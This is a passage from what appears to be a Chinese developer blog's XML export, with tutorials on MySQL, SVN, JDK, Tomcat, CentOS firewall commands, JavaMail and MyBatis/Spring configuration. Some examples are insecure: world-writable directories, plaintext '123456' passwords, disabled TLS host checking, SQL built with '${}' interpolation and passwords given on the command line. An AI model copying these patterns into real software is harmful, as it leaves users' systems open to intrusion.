注：在启动MySQL服务时，会按照一定次序搜索my.cnf，先在/etc目录下找，找不到则会搜索”$basedir/my.cnf”，在本例中就是 /usr/local/mysql/my.cnf，这是新版MySQL的配置文件的默认位置！ 2、配置my.cnf1vim /etc/my.cnf 我的my.cnf,如下:,这个可以根据自己的需求改，不改也是可以的。 12345678[mysqld]character_set_server=utf8mb4init_connect=&apos;SET NAMES utf8&apos;lower_case_table_names=1sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION [client]default-character-set=utf8mb4 六、添加服务12345678910111213141516171819202122232425#配置mysql服务开机自动启动拷贝启动文件到/etc/init.d/下并重命令为mysqlcp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysql#增加执行权限chmod 755 /etc/init.d/mysql #检查自启动项列表中没有mysql这个，如果没有就添加mysql：chkconfig --list mysqlchkconfig --add mysql #设置MySQL在345等级自动启动chkconfig --level 345 mysql on #或用这个命令设置开机启动：chkconfig mysql on #mysql服务的启动/重启/停止#启动mysql服务service mysql start#重启mysql服务service mysql restart#停止mysql服务service mysql stop11 访问mysql数据库连接mysql， 输入初始化生成的随机密码然后修改密码 12345678#mysql创建用户CREATE USER &apos;username&apos;@&apos;localhost&apos; IDENTIFIEDBY &apos;password&apos;;#授权GRANT privileges ON databasename.tablename TO &apos;username&apos;@&apos;localhost&apos;；#刷新flush privileges;]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git 小笔记]]></title>
    <url>%2Fblog%2F2017%2F05%2F20%2FGit%20%E5%B0%8F%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[git 删除远程idea 文件1234567891011121314151617181、查看远程分支$ git branch -a 2、查看本地分支git branch3、切换分支git checkout master4、删除缓存区.idea（保留工作区.idea）$ git rm --cached -r .idea$ git rm --cached -r *.iml# 将.idea从源代码仓库中删除（-m 表示备注）$ git commit -m &quot;commit and remove .idea&quot;# 推送到远程端$ git push origin master]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 下安装配置svn服务器]]></title>
    <url>%2Fblog%2F2017%2F05%2F19%2FLinux%20%E4%B8%8B%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEsvn%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[1、安装svn服务器（以cenos为例）1yum install subversion 2、创建svn版本仓库12345cd /usr/local/ #进入目录，准备创建svn目录 mkdir svnRepo #创建一个svn目录chmod -R 777 svnRepo #修改目录权限为777 svnadmin create /usr/local/svnRepo/test #创建一个svn版本仓库test(test可以随便起名字) cd test/conf #进入test版本仓库下的配置文件目录 3、修改这个目录下的三个配置文件(1) svnserve.conf //配置版本库信息和用户文件和用户密码文件的路径、版本库路径12345anon-access = none #默认是只读readauth-access = write #认证后有写入权限password-db = passwd #帐号密码配置文件authz-db = authz #权限配置文件realm = test #改成自己的版本库 生效范围 (2) authz //文件,创建svn组和组用户的权限12345[group] first = ddl,shl #创建一个first的组，并制定两个用户ddl和shl [test:/] #指定版本库跟目录下的权限 @first = rw #first组用户权限为读写 * = r #其他用户只读，不给则为空串 (3) passwd //创建或修改用户密码123[users] ddl = 123456 #用户名 = 密码shl = 123456 3、然后设置自启动1vim /etc/rc.d/rc.local 在最后添加如下信息：12#--listen-port 3690 是指定端口启动，默认是3690，--log-file 是SVN日志文件 ，当然两个参数都可以不指定svnserve -d -r /usr/local/svnRepo --listen-port 3699 --log-file=/var/log/svnserver.log SVN版本库启动方式，现在svnRepo下面有 test、test2 两个版本库1234567# 1：单版本库起动 svnserve -d -r /usr/local/svnRepo/test# 2：多版本库起动 svnserve -d -r /usr/local/svnRepo# 区别在于起动svn时候的命令中的启动参数-r指定的目录。 svn 基本命令123456789lsof -i :3690 #查看svn是否启动 ps aux |grep &apos;svn&apos; #查找所有svn启动的进程 kill -9 2505 #杀死2505这个查找到的svn进程 svnserve -d -r /usr/local/svnRepo/first #启动svn(可以把这个放到/etc/local/rc.local文件中，实现开机自启动) netstat -anp|grep svnserve #查看一下SVN信息 4、客户端访问假设客户端使用tortoiseSVN打开资源库浏览器输入地址, svn://你的svn服务器ip:3690输入用户名uername 密码123456因为没有网资源库里放文件所以需要你用客户端右键【create forder】，然后【add forder】]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>SVN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 安装jdk]]></title>
    <url>%2Fblog%2F2017%2F05%2F13%2FLinux%20%E5%AE%89%E8%A3%85jdk%2F</url>
    <content type="text"><![CDATA[1.判断是否安装了jdk1234rpm -qa | grep jdk 或者 rpm -qa | grep openjdk#有则卸载，-nodeps 是强制卸载rpm -e --nodeps jdk-xxx 2.下载jdk包####官网：http://www.oracle.com/technetwork/java/javase/downloads/index.html1wget --no-check-certificate --no-cookies --header &quot;Cookie: oraclelicense=accept-securebackup-cookie&quot; http://download.oracle.com/otn-pub/java/jdk/8u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-8u131-linux-x64.tar.gz 3.解压1tar -zxvf jdk-8u131-linux-x64.tar.gz -C /usr/local/ 4.重命名12cd /usr/localmv jdk-8u131-linux-x64 jdk 5.配置环境变量(1)、编辑配置文件1vim /etc/profile (2)、在文件最后添加如下：1234export JAVA_HOME=/usr/local/jdkexport JRE_HOME=$&#123;JAVA_HOME&#125;/jreexport CLASSPATH=.:$JAVA_HOME/lib:$&#123;JRE_HOME&#125;/libexport PATH=$JAVA_HOME/bin:$PATH (3)、使配置文件直接生效1source /etc/profile (4)、测试是否配置成功1java -version]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7 安装tomcat，并添加服务]]></title>
    <url>%2Fblog%2F2017%2F05%2F10%2FCentos7%20%E5%AE%89%E8%A3%85tomcat%EF%BC%8C%E5%B9%B6%E6%B7%BB%E5%8A%A0%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[一、下载源码包###官网：https://tomcat.apache.org/download-80.cgi ####复制下载地址，到 linux 用 wget下载1wget http://mirrors.hust.edu.cn/apache/tomcat/tomcat-8/v8.5.14/bin/apache-tomcat-8.5.14.tar.gz 二、解压源码包12# -C 是解压到指定位置，这里的位置为：/usr/localtar -zxvf apache-tomcat-8.5.14.tar.gz -C /usr/local 三、重命名 (可选)12cd /usr/localmv apache-tomcat-8.5.14 tomcat 四、配置环境变量1vim /etc/profile ###在最后加入,下面两行代码12export CATALINA_HOME=/usr/local/tomcatexport CATALINA_BASE=/usr/local/tomcat 五、添加服务(1)、修改tomcat的bin目录下的catalina.sh 文件1vim /usr/local/tomcat/bin/catalina.sh (2)、在定义CATALINA_BASE定义的后面加上1CATALINA_PID=&quot;$CATALINA_BASE/tomcat.pid&quot; #####如下图所示： (3)、创建tomcat.service1vim /lib/systemd/system/tomcat.service 写入如下内容12345678910111213141516171819[Unit] Description=TomcatAfter=syslog.target network.target remote-fs.target nss-lookup.target [Service] Type=forking Environment=&quot;JAVA_HOME=/usr/local/jdk&quot;PIDFile=/usr/local/tomcat/tomcat.pidExecStart=/usr/local/tomcat/bin/startup.shExecReload=/bin/kill -s HUP $MAINPIDExecStop=/bin/kill -s QUIT $MAINPIDPrivateTmp=true [Install] WantedBy=multi-user.target 最后记得 保存 才退出（ESC键 ,然后shift + ；，然后 wq）,（啰嗦 ，哈哈） (4)、测试是否可以用systemctl 来操作tomcat12345678#启动tomcatsystemctl start tomcat #关闭tomcatsystemctl stop tomcat#查看是否启动成功ps aux | grep tomcat 正文到此结束，谢谢观看，觉得有用，赞一个再走啊，客官！]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>开发工具</tag>
        <tag>系统装机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL 错误 列表]]></title>
    <url>%2Fblog%2F2017%2F05%2F09%2FMYSQL%20%E9%94%99%E8%AF%AF%20%E5%88%97%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[一、错误如下： [Err] 1055 - Expression #1 of ORDER BY clause is not in GROUP BY clause and contains nonaggregated column ‘information_schema.PROFILING.SEQ’ which is not functionally dependent on columns in GROUP BY clause;this is incompatible with sql_mode=only_full_group_by 解决方法：在/etc/my.cnf 的最后面加一句话1sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION ####保存退出： ####重启mysql服务器，搞定 二、错误如下： mysql: [Warning] Using a password on the command line interface can be insecure.ERROR 1840 (HY000) at line 24: @@GLOBAL.GTID_PURGED can only be set when @@GLOBAL.GTID_EXECUTED is empty. 报这个错误的时候是再当你导入数据的时候报的，解决方法：1、进入mysql 模式，运行1reset master; 这个比较麻烦的是，当你导入数据的时候，都要 reset master 一次。2、就是当你导出数据的时候加参数 ：–set-gtid-purged=OFF,例如1234# 导出数据mysqldump -h 192.168.1.1 -u root -ppassword --set-gtid-purged=OFF daname &gt; db.sql# 导入数据mysql -u root -ppassword dbname &lt; db.sql]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos 防火墙相关命令]]></title>
    <url>%2Fblog%2F2017%2F05%2F08%2FCentos%20%E9%98%B2%E7%81%AB%E5%A2%99%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[这里主要介绍centos7 和centos 6 的防火墙相关命令顺便说一下最小化安装centos7后 上不了网的问题Centos 612345678910111213141516#查看开放端口service iptables status#开启8080端口 ,下面是命令，# 方法二是 修改 /etc/sysconfig/iptables 文件，添加： -A INPUT -p tcp -m tcp --dport 8080 -j ACCEPT/sbin/iptables -I INPUT -p tcp --dport 8080 -j ACCEPT#防火墙开启命令: service iptables start#防火墙关闭命令: service iptables stop #永久关闭防火墙：chkconfig iptables off ####可能发生的异常123456789101112131415具体的异常现象： #1.启动或者关闭防火墙没任何的提示[root@ethnicity ~]# service iptables start[root@ethnicity ~]# service iptables stop#2.查看防火墙的状态直接提示模块未加载[root@ethnicity ~]# service iptables statusiptables: Firewall modules are not loaded.修复的方法： modprobe ip_tables #加载ip_tables模块modprobe iptable_filter #加载iptable_filter模块[root@ethnicity ~]# lsmod | grep iptable #查看模块，有模块即解决了iptable_filter 2173 0 ip_tables 9567 1 iptable_filter Centos 7###Centos7 的firewalld 取代了centos6 的iptables ####端口命令12345678910111213#查看开放端口firewall-cmd --list-ports#开启端口 --permanent 是永久有效firewall-cmd --zone=public --add-port=80/tcp --permanent #开启范围端口 8080 - 9090范围的端口firewall-cmd --zone=public --add-port=8080-9090/tcp --permanent#查看firewall-cmd --zone= public --query-port=80/tcp # 删除firewall-cmd --zone= public --remove-port=80/tcp --permanent 参数 描述 –zone 作用域 –add-port=80/tcp 添加端口，格式为：端口/通讯协议 –permanent 设置永久生效，没有此参数重启后失效 ####防火墙命令12345firewall-cmd --reload #重启firewallfirewall-cmd --state #查看防火墙状态systemctl start firewalld.service #开启firewallsystemctl stop firewalld.service #停止firewallsystemctl disable firewalld.service #禁止firewall开机启动 顺便说一下 最小化安装centos7后 上不了网的问题1234vi /etc/sysconfig/network-scripts/ifcfg-ens33# 将 ONBOOT=no 改为 ONBOOT=yes# 重启网卡service network restart 就像我们所知道的，“ifconfig”命令用于配置GNU/Linux系统的网络接口。它显示网络接口卡的详细信息，包括IP地址，MAC地址，以及网络接口卡状态之类。但是，该命令已经过时了，而且在最小化版本的RHEL 7以及它的克隆版本CentOS 7，Oracle Linux 7和Scientific Linux 7中也找不到该命令。我们可以用1ip addr 正文到此结束，谢谢观看]]></content>
      <categories>
        <category>网络运维</category>
      </categories>
      <tags>
        <tag>干货</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java QQ邮箱发送邮件]]></title>
    <url>%2Fblog%2F2017%2F05%2F05%2FJava%20QQ%E9%82%AE%E7%AE%B1%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[一、首先qq邮箱要开启POP3 /SMTP 服务###这个去QQ邮箱设置那里进行设置 二、获取授权码###看上图中的生成授权码，点击然后按它提示获取并保存 三、添加依赖123456&lt;!-- javamail --&gt;&lt;dependency&gt; &lt;groupId&gt;javax.mail&lt;/groupId&gt; &lt;artifactId&gt;mail&lt;/artifactId&gt; &lt;version&gt;1.4.7&lt;/version&gt;&lt;/dependency&gt; 四、代码示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152 /** * 发送验证码 * @param message 邮件的内容 * @param title 邮件的标题 * @param toAddress 接收人的邮箱地址 */ public void sendEmail(String message,String title,String toAddress)&#123; Properties props = new Properties(); // 开启debug调试 props.setProperty(&quot;mail.debug&quot;, &quot;false&quot;); // 发送服务器需要身份验证 props.setProperty(&quot;mail.smtp.auth&quot;, &quot;true&quot;); // 设置邮件服务器主机名 props.setProperty(&quot;mail.host&quot;, &quot;smtp.qq.com&quot;); // 发送邮件协议名称 props.setProperty(&quot;mail.transport.protocol&quot;, &quot;smtp&quot;); MailSSLSocketFactory sf; Transport transport =null; try &#123; sf = new MailSSLSocketFactory(); sf.setTrustAllHosts(true); props.put(&quot;mail.smtp.ssl.enable&quot;, &quot;true&quot;); props.put(&quot;mail.smtp.ssl.socketFactory&quot;, sf); Session session = Session.getInstance(props); Message msg = new MimeMessage(session); msg.setSubject(title); StringBuilder builder = new StringBuilder(); builder.append(message); builder.append(&quot;\n\n 时间: &quot; + DateUtil.getTime());// msg.setText(builder.toString()); msg.setFrom(new InternetAddress(&quot;你的邮箱地址&quot;)); msg.setContent(builder.toString(), &quot;text/html;charset=utf-8&quot;); // 设置邮件格式 transport = session.getTransport(); transport.connect(&quot;smtp.qq.com&quot;, &quot;你的邮箱地址&quot;, &quot;你的授权码&quot;); transport.sendMessage(msg, new Address[] &#123; new InternetAddress(toAddress)&#125;);//这里可以发送给多个人 &#125; catch (GeneralSecurityException e) &#123; log.info(&quot;ssl 验证错误&quot;); e.printStackTrace(); &#125;catch (Exception e) &#123; log.info(&quot;程序异常&quot;, e); &#125;finally&#123; if(transport != null)&#123; try &#123; transport.close(); &#125; catch (MessagingException e) &#123; log.info(&quot;transport 关闭异常&quot;, e); e.printStackTrace(); &#125; &#125; &#125; log.info(&quot;邮件发送成功!&quot;); &#125;]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>干货</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mybatis 中 foreach collection的 用法]]></title>
    <url>%2Fblog%2F2017%2F05%2F03%2Fmybatis%20%E4%B8%AD%20foreach%20collection%E7%9A%84%20%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Mybits foreach 的用法foreach元素的属性主要有 item，index，collection，open，separator，close。 属性 说明 item 表示集合中每一个元素进行迭代时的别名， index 指 定一个名字，用于表示在迭代过程中，每次迭代到的位置， open 表示该语句以什么开始， separator 表示在每次进行迭代之间以什么符号作为分隔符， close 表示以什么结束。 在使用foreach的时候最关键的也是最容易出错的就是collection属性，该属性是必须指定的，但是在不同情况 下，该属性的值是不一样的，主要有一下3种情况：1. 如果传入的是单参数且参数类型是一个List的时候，collection属性值为list2. 如果传入的是单参数且参数类型是一个array数组的时候，collection的属性值为array3. 如果传入的参数是多个的时候，我们就需要把它们封装成一个Map了，当然单参数也可上例子一、通过id获取多条数据List 类型的我都配置了别名list,参数是 List&lt;Article&gt; ，Article 是我自己定义的实体类123456789101112131415&lt;!-- 获取标签文章列表 --&gt;&lt;select id=&quot;getArticleList&quot; parameterType=&quot;list&quot; resultType=&quot;pm&quot;&gt;SELECT *from blog_article awhere a.article_id in &lt;foreach item=&quot;item&quot; collection=&quot;list&quot; index=&quot;index&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt; #&#123;item.article_id&#125; &lt;/foreach&gt; and isdel=0order by a.create_time desc,a.update_time desc&lt;/select&gt; 二、批量插入数据12345678910111213&lt;!-- 批量新增--&gt;&lt;insert id=&quot;batchSaveArticleLabel&quot; parameterType=&quot;list&quot;&gt; insert into blog_article_label( article_id, label_id ) values &lt;foreach collection=&quot;list&quot; item=&quot;item&quot; index=&quot;index&quot; separator=&quot;,&quot; &gt; ( #&#123;item.article_id&#125;, #&#123;item.label_id&#125; ) &lt;/foreach&gt;&lt;/insert&gt; 三、对一个字段进行多次模糊匹配123456select * from table&lt;where&gt; &lt;foreach collection="list" item="item" index="index" separator="or"&gt; name like '%$&#123;item&#125;%' &lt;/foreach&gt;&lt;/where&gt; 上面的参数都是 List,如果是 String[] 这种的就是把collection 的值改为array,如下demo四、批量删除12345678910&lt;delete id=&quot;getArticleList&quot; parameterType=&quot;String&quot;&gt;DEKETEfrom blog_article awherea.article_id in&lt;foreach collection=&quot;array&quot; index=&quot;index&quot; item=&quot;item&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt; #&#123;item&#125;&lt;/foreach&gt;&lt;/delete&gt; 五、批量修改参数是 Map&lt;String,Object&gt; ,我下面写map 是因为配置了别名Java 代码是这样的:1234Map&lt;String,Object&gt; map = new HashMap&lt;&gt;();String[] ids = &#123;&quot;1&quot;,&quot;2&quot;,&quot;3&quot;&#125;;map.put(&quot;content&quot;,&quot;修改的内容&quot;);map.put(&quot;ids&quot;,ids); mapper 文件12345678910&lt;update id=&quot;update&quot; parameterType=&quot;map&quot;&gt;UPDATE table set content=&quot;#&#123;content&#125;&quot;WHEREid in&lt;foreach collection=&quot;ids&quot; index=&quot;index&quot; item=&quot;item&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt; #&#123;item&#125;&lt;/foreach&gt;&lt;/update&gt; 还有一种123456789101112&lt;update id=&quot;updateUserChildNum&quot; parameterType=&quot;list&quot;&gt; UPDATE usr_relation_umbrella SET child_number = CASE user_id &lt;foreach collection=&quot;list&quot; item=&quot;item&quot;&gt; WHEN #&#123;item.userId&#125; THEN #&#123;item.childNumber&#125; &lt;/foreach&gt; END WHERE user_id IN &lt;foreach item=&quot;item&quot; collection=&quot;list&quot; index=&quot;index&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt; #&#123;item.userId&#125; &lt;/foreach&gt; &lt;/update&gt; 多个123456789101112UPDATE categories SET display_order = CASE id WHEN 1 THEN 3 WHEN 2 THEN 4 WHEN 3 THEN 5 END, title = CASE id WHEN 1 THEN &apos;New Title 1&apos; WHEN 2 THEN &apos;New Title 2&apos; WHEN 3 THEN &apos;New Title 3&apos; ENDWHERE id IN (1,2,3)]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring+mybatis 配置多个数据源]]></title>
    <url>%2Fblog%2F2017%2F05%2F01%2FSpring%2Bmybatis%20%E9%85%8D%E7%BD%AE%E5%A4%9A%E4%B8%AA%E6%95%B0%E6%8D%AE%E6%BA%90%2F</url>
    <content type="text"><![CDATA[这个是spring+springmvc+mybatis框架的方法一、编辑配置文件：spring-mybatis.xml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xmlns:p=&quot;http://www.springframework.org/schema/p&quot; xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot; xmlns:task=&quot;http://www.springframework.org/schema/task&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd http://www.springframework.org/schema/task http://www.springframework.org/schema/task/spring-task.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;context:annotation-config/&gt; &lt;context:component-scan base-package=&quot;com.lrs.test&quot;/&gt; &lt;context:property-placeholder location=&quot;classpath:config-*.properties&quot; /&gt; &lt;!-- 定时任务配置 --&gt; &lt;task:annotation-driven scheduler=&quot;qbScheduler&quot; mode=&quot;proxy&quot; /&gt; &lt;task:scheduler id=&quot;qbScheduler&quot; pool-size=&quot;10&quot; /&gt; &lt;!--统一的dataSource--&gt; &lt;bean id=&quot;dynamicDataSource&quot; class=&quot;com.lrs.test.source.DynamicDataSource&quot; &gt; &lt;property name=&quot;targetDataSources&quot;&gt; &lt;map key-type=&quot;java.lang.String&quot;&gt; &lt;!--通过不同的key决定用哪个dataSource--&gt; &lt;entry value-ref=&quot;dataSourceA&quot; key=&quot;dataSourceA&quot;&gt;&lt;/entry&gt; &lt;entry value-ref=&quot;dataSourceB&quot; key=&quot;dataSourceB&quot;&gt;&lt;/entry&gt; &lt;/map&gt; &lt;/property&gt; &lt;!--设置默认的dataSource--&gt; &lt;property name=&quot;defaultTargetDataSource&quot; ref=&quot;dataSourceA&quot;&gt; &lt;/property&gt; &lt;/bean&gt; &lt;!-- 数据源A --&gt; &lt;bean id=&quot;dataSourceA&quot; class=&quot;com.alibaba.druid.pool.DruidDataSource&quot; init-method=&quot;init&quot; destroy-method=&quot;close&quot;&gt; &lt;!-- 基本属性 url、user、password --&gt; &lt;property name=&quot;url&quot; value=&quot;$&#123;jdbc.url.A&#125;&quot; /&gt; &lt;property name=&quot;username&quot; value=&quot;$&#123;jdbc.username&#125;&quot; /&gt; &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot; /&gt; &lt;!-- 配置初始化大小、最小、最大 --&gt; &lt;property name=&quot;initialSize&quot; value=&quot;1&quot; /&gt; &lt;property name=&quot;minIdle&quot; value=&quot;1&quot; /&gt; &lt;property name=&quot;maxActive&quot; value=&quot;20&quot; /&gt; &lt;!-- 配置获取连接等待超时的时间 --&gt; &lt;property name=&quot;maxWait&quot; value=&quot;60000&quot; /&gt; &lt;!-- 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒 --&gt; &lt;property name=&quot;timeBetweenEvictionRunsMillis&quot; value=&quot;60000&quot; /&gt; &lt;!-- 配置一个连接在池中最小生存的时间，单位是毫秒 --&gt; &lt;property name=&quot;minEvictableIdleTimeMillis&quot; value=&quot;300000&quot; /&gt; &lt;property name=&quot;validationQuery&quot; value=&quot;SELECT &apos;x&apos;&quot; /&gt; &lt;property name=&quot;testWhileIdle&quot; value=&quot;true&quot; /&gt; &lt;property name=&quot;testOnBorrow&quot; value=&quot;false&quot; /&gt; &lt;property name=&quot;testOnReturn&quot; value=&quot;false&quot; /&gt; &lt;!-- 打开PSCache，并且指定每个连接上PSCache的大小 --&gt; &lt;property name=&quot;poolPreparedStatements&quot; value=&quot;true&quot; /&gt; &lt;property name=&quot;maxPoolPreparedStatementPerConnectionSize&quot; value=&quot;20&quot; /&gt; &lt;!-- 配置监控统计拦截的filters，去掉后监控界面sql无法统计 --&gt; &lt;property name=&quot;filters&quot; value=&quot;stat&quot; /&gt; &lt;/bean&gt; &lt;!-- 数据源B --&gt; &lt;bean id=&quot;dataSourceB&quot; class=&quot;com.alibaba.druid.pool.DruidDataSource&quot; init-method=&quot;init&quot; destroy-method=&quot;close&quot;&gt; &lt;!-- 基本属性 url、user、password --&gt; &lt;property name=&quot;url&quot; value=&quot;$&#123;jdbc.url.B&#125;&quot; /&gt; &lt;property name=&quot;username&quot; value=&quot;$&#123;jdbc.username&#125;&quot; /&gt; &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot; /&gt; &lt;!-- 配置初始化大小、最小、最大 --&gt; &lt;property name=&quot;initialSize&quot; value=&quot;1&quot; /&gt; &lt;property name=&quot;minIdle&quot; value=&quot;1&quot; /&gt; &lt;property name=&quot;maxActive&quot; value=&quot;20&quot; /&gt; &lt;!-- 配置获取连接等待超时的时间 --&gt; &lt;property name=&quot;maxWait&quot; value=&quot;60000&quot; /&gt; &lt;!-- 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒 --&gt; &lt;property name=&quot;timeBetweenEvictionRunsMillis&quot; value=&quot;60000&quot; /&gt; &lt;!-- 配置一个连接在池中最小生存的时间，单位是毫秒 --&gt; &lt;property name=&quot;minEvictableIdleTimeMillis&quot; value=&quot;300000&quot; /&gt; &lt;property name=&quot;validationQuery&quot; value=&quot;SELECT &apos;x&apos;&quot; /&gt; &lt;property name=&quot;testWhileIdle&quot; value=&quot;true&quot; /&gt; &lt;property name=&quot;testOnBorrow&quot; value=&quot;false&quot; /&gt; &lt;property name=&quot;testOnReturn&quot; value=&quot;false&quot; /&gt; &lt;!-- 打开PSCache，并且指定每个连接上PSCache的大小 --&gt; &lt;property name=&quot;poolPreparedStatements&quot; value=&quot;true&quot; /&gt; &lt;property name=&quot;maxPoolPreparedStatementPerConnectionSize&quot; value=&quot;20&quot; /&gt; &lt;!-- 配置监控统计拦截的filters，去掉后监控界面sql无法统计 --&gt; &lt;property name=&quot;filters&quot; value=&quot;stat&quot; /&gt; &lt;/bean&gt; &lt;!-- DAO接口所在包名，Spring会自动查找其下的类 --&gt; &lt;bean class=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&gt; &lt;property name=&quot;basePackage&quot; value=&quot;com.lrs.test.dao&quot; /&gt; &lt;property name=&quot;sqlSessionFactoryBeanName&quot; value=&quot;sqlSessionFactory&quot;&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!-- sqlSessionFactory --&gt; &lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt; &lt;!-- 数据库连接池 --&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dynamicDataSource&quot; /&gt; &lt;!-- 加载mybatis的全局配置文件 --&gt; &lt;property name=&quot;configLocation&quot; value=&quot;classpath:mybatis/mybatis-config.xml&quot; /&gt; &lt;!-- mapper扫描 --&gt; &lt;property name=&quot;mapperLocations&quot; value=&quot;classpath:mapper/*.xml&quot;&gt;&lt;/property&gt; &lt;/bean&gt; &lt;!-- 通过Spring进行事务的管理，我们需要增加Spring注解的事务管理机制 --&gt; &lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dynamicDataSource&quot; /&gt; &lt;/bean&gt; &lt;!-- 通知 --&gt; &lt;tx:advice id=&quot;txAdvice&quot; transaction-manager=&quot;transactionManager&quot;&gt; &lt;tx:attributes&gt; &lt;!-- 传播行为 --&gt; &lt;tx:method name=&quot;save*&quot; propagation=&quot;REQUIRED&quot; /&gt; &lt;tx:method name=&quot;delete*&quot; propagation=&quot;REQUIRED&quot; /&gt; &lt;tx:method name=&quot;insert*&quot; propagation=&quot;REQUIRED&quot; /&gt; &lt;tx:method name=&quot;update*&quot; propagation=&quot;REQUIRED&quot; /&gt; &lt;tx:method name=&quot;find*&quot; propagation=&quot;SUPPORTS&quot; read-only=&quot;true&quot; /&gt; &lt;tx:method name=&quot;get*&quot; propagation=&quot;SUPPORTS&quot; read-only=&quot;true&quot; /&gt; &lt;tx:method name=&quot;select*&quot; propagation=&quot;SUPPORTS&quot; read-only=&quot;true&quot; /&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; &lt;!-- 配置事务切面 --&gt; &lt;aop:config proxy-target-class=&quot;true&quot;&gt; &lt;aop:pointcut id=&quot;serviceOperation&quot; expression=&quot;execution(* com.lrs.test.service..*.*(..))&quot; /&gt; &lt;aop:advisor advice-ref=&quot;txAdvice&quot; pointcut-ref=&quot;serviceOperation&quot; /&gt; &lt;/aop:config&gt; &lt;/beans&gt; 二、解决线程安全问题###利用ThreadLocal,设置当前线程使用的是哪个dataSource1234567891011121314151617181920212223public class CustomerContextHolder &#123; public static final String DATA_SOURCE_A = &quot;dataSourceA&quot;; public static final String DATA_SOURCE_B = &quot;dataSourceB&quot;; private static final ThreadLocal&lt;String&gt; contextHolder = new ThreadLocal&lt;String&gt;(); public static void setCustomerType(String customerType) &#123; contextHolder.set(customerType); &#125; public static String getCustomerType() &#123; String dataSource = contextHolder.get(); if (StringUtils.isEmpty(dataSource)) &#123; return DATA_SOURCE_A; &#125;else &#123; return dataSource; &#125; &#125; public static void clearCustomerType() &#123; contextHolder.remove(); &#125; &#125; 三、自定义一个动态数据源####创建DynamicDataSource类继承AbstractRoutingDataSource ####并实现determineCurrentLookupKey方法12345678public class DynamicDataSource extends AbstractRoutingDataSource &#123; @Override protected Object determineCurrentLookupKey() &#123; return CustomerContextHolder.getCustomerType(); &#125; &#125; 四、service 层实现数据切换1CustomerContextHolder.setCustomerType(CustomerContextHolder.DATA_SOURCE_B);]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
